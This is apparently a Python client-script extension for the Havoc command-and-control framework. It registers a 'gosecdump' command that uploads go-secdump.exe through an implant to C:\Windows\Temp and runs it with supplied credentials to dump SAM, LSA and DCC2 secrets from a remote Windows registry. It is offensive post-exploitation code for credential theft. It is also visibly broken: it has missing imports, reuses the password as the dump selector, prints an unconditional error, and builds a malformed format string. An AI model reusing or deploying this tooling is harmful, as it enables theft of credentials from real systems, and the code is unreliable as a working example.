from havoc import Demon, RegisterCommand
from struct import pack, calcsize

def gosecdump(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    gosecdump_current_dir = os.getcwd()
    gosecdump_install_path = "/Documents/tools/Havoc/data/extensions/havoc-gosecdump/"
    agent_bin = gosecdump_current_dir + gosecdump_install_path + "gosecdump/go-secdump.exe"

    demon  = Demon( demonID )

    if len(param) < 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments please set host,username,password and what you want to dump" )
        return False

    Host    = param[ 0 ]
    Username = param[ 1 ]
    Password = param[ 2 ]
    SelectDump = param[ 2 ]

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "x86 is not supported")
        return False
#    TaskID = demon.ConsoleWrite(demon.CONSOLE_INFO, "send order to agent to retrieve secrets")
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to upload gosecdump.exe")
    demon.Command(TaskID, "cd c:\\windows\\Temp")
    demon.ConsoleWrite(demon.CONSOLE_INFO, "Upload go-secdump to C:\Windows\Temp")
    #if not os.path.exists(agent_bin):
    demon.ConsoleWrite( demon.CONSOLE_ERROR, "Go-secdump.exe already exist in C:\Windows\Temp")
    demon.Command(TaskID, "upload %s" % (agent_bin))
    demon.Command(TaskID, "shell c:\\windows\\Temp\\go-secdump.exe --host %s --user %s --pass %s" % Host, Username, Password, SelectDump)
    #demon.Command(TaskID, "noconsolation c:\\windows\\Temp\\go-secdump.exe") with this way no need to upload,

    return TaskID

RegisterCommand( gosecdump, "", "gosecdump", "Tool to remotely dump secrets from the Windows registry (SAM,LSA, DCC2)", 3, "[exploit] (args)", "" )
# https://github.com/HavocFramework/Website/blob/dev/docs%2F12.%20Client%20Script.md

# make sure gosecdump is inside /home/havoc/data/extensions/havoc-gosecdump/gosecdump/gosecdump.exe